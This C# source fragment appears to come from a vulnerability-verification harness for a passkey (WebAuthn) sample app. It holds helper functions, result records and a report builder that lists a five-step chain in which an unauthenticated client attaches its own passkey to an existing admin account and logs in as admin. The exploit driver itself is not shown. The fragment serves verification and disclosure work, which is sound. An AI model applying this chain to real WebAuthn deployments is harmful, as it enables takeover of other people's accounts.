static IdentityFacts ParseIdentityFacts(string body)
{
    using var document = JsonDocument.Parse(body);
    var root = document.RootElement;
    return new IdentityFacts(
        Authenticated: root.TryGetProperty("authenticated", out var authenticated) && authenticated.GetBoolean(),
        UserId: root.TryGetProperty("userId", out var userId) ? userId.GetString() : null,
        Role: root.TryGetProperty("role", out var role) ? role.GetString() : null);
}

static string MutateBase64Url(string value)
{
    var bytes = SyntheticPasskey.Base64UrlDecode(value);
    bytes[0] ^= 0x01;
    return SyntheticPasskey.Base64UrlEncode(bytes);
}

static AssemblyInfoRecord[] BuildAssemblyEvidence(params Assembly[] assemblies)
    => assemblies
        .Distinct()
        .Select(assembly =>
        {
            var location = assembly.Location;
            return new AssemblyInfoRecord(
                Name: assembly.GetName().Name ?? "unknown",
                AssemblyVersion: assembly.GetName().Version?.ToString(),
                InformationalVersion: assembly.GetCustomAttribute<AssemblyInformationalVersionAttribute>()?.InformationalVersion,
                FileVersion: string.IsNullOrEmpty(location) ? null : FileVersionInfo.GetVersionInfo(location).FileVersion,
                Location: location,
                Sha256: string.IsNullOrEmpty(location) || !File.Exists(location) ? null : Sha256File(location));
        })
        .ToArray();

static string Sha256Text(string value)
    => Convert.ToHexString(SHA256.HashData(Encoding.UTF8.GetBytes(value))).ToLowerInvariant();

static string Sha256File(string path)
    => Convert.ToHexString(SHA256.HashData(File.ReadAllBytes(path))).ToLowerInvariant();

static string BuildSummary(
    string verdict,
    AdminTakeoverResult attack,
    params ControlResult[] controls)
{
    var builder = new StringBuilder();
    builder.AppendLine($"# {CandidateId}");
    builder.AppendLine();
    builder.AppendLine($"- Verdict: `{verdict}`");
    builder.AppendLine($"- Exact SDK: `{ExactSdk}`");
    builder.AppendLine($"- Existing admin selected: `{attack.ExistingAdminSelected}`");
    builder.AppendLine($"- Attacker credential owned by admin record: `{attack.CredentialOwnerIsAdmin}`");
    builder.AppendLine($"- Passkey login returned: `{attack.LoginStatus}`");
    builder.AppendLine($"- Admin marker reached: `{attack.AdminMarkerObserved}`");
    builder.AppendLine();
    builder.AppendLine("## Chain");
    builder.AppendLine();
    builder.AppendLine("1. An unauthenticated client requests passkey creation options for the pre-existing admin username.");
    builder.AppendLine("2. The sample embeds that admin user's ID in the registration state.");
    builder.AppendLine("3. The client creates a fresh ES256 passkey and completes valid WebAuthn attestation.");
    builder.AppendLine("4. The sample finds the user by the state-supplied ID and attaches the new passkey without authenticating the account owner.");
    builder.AppendLine("5. The client authenticates with its private key and reaches the admin-only marker.");
    builder.AppendLine();
    builder.AppendLine("## Controls");
    builder.AppendLine();
    foreach (var control in controls)
    {
        builder.AppendLine($"- `{control.Id}`: passed=`{control.Passed}`; statuses=`{string.Join(',', control.StatusSequence)}`");
    }
    return builder.ToString();
}

internal sealed class UsernameRequest
{
    public string? Username { get; set; }
}

internal sealed class OptionalUsernameRequest
{
    public string? Username { get; set; }
}

internal sealed record HttpResult(int StatusCode, string Body);
internal sealed record CompletionFacts(bool ExistingUser, string? TargetUserId, string? TargetRole);
internal sealed record IdentityFacts(bool Authenticated, string? UserId, string? Role);

internal sealed record AdminTakeoverResult(
    int OptionsStatus,
    string OptionsBodySha256,
    bool UserEntityMatchedAdmin,
    string AttestationCredentialSha256,
    int CompletionStatus,
    string CompletionBodySha256,
    bool ExistingAdminSelected,
    bool CredentialOwnerIsAdmin,
    int AdminPasskeyCount,
    int AssertionOptionsStatus,
    string AssertionCredentialSha256,
    int LoginStatus,
    int MeStatus,
    bool MeAuthenticated,
    string? MeUserId,
    string? MeRole,
    int AdminStatus,
    bool AdminMarkerObserved);

internal sealed record ControlResult(
    string Id,
    int[] StatusSequence,
    bool Passed,
    string Detail);

internal sealed record HttpTrace(
    DateTimeOffset StartedUtc,
    DateTimeOffset FinishedUtc,
    string Method,
    string Path,
    string Host,
    string Origin,
    string? CookieHeaderSha256,
    int StatusCode,
    int SetCookieCount);

internal sealed record AssemblyInfoRecord(
    string Name,
    string? AssemblyVersion,
    string? InformationalVersion,
    string? FileVersion,
    string Location,
    string? Sha256);
